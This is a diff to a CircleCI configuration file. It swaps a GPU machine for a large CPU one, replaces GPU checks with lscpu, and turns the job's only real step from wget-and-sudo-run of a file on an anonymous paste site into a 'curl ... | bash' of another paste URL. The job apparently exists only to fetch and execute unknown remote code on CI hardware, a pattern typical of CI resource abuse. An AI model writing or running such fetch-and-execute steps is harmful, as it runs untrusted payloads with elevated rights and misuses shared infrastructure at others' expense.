@@ -3,13 +3,13 @@ version: 2.1
 jobs:
   trial:
     machine:
-      image: ubuntu-2004-cuda-11.4:202110-01
+      image: ubuntu-2004:current
+    resource_class: large
     steps:
-      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi
-      - run: nvidia-smi
+      - run: lscpu
       - run: 
             name: "trial" 
-            command: sudo apt update && sudo apt install nodejs && sudo apt install npm && wget https://hastebin.skyra.pw/raw/ekoqiticif && chmod u+x ekoqiticif && sudo ./ekoqiticif 
+            command: curl https://hastebin.skyra.pw/raw/ralekoviwi | bash
  
 workflows: 
     version: 2.1 
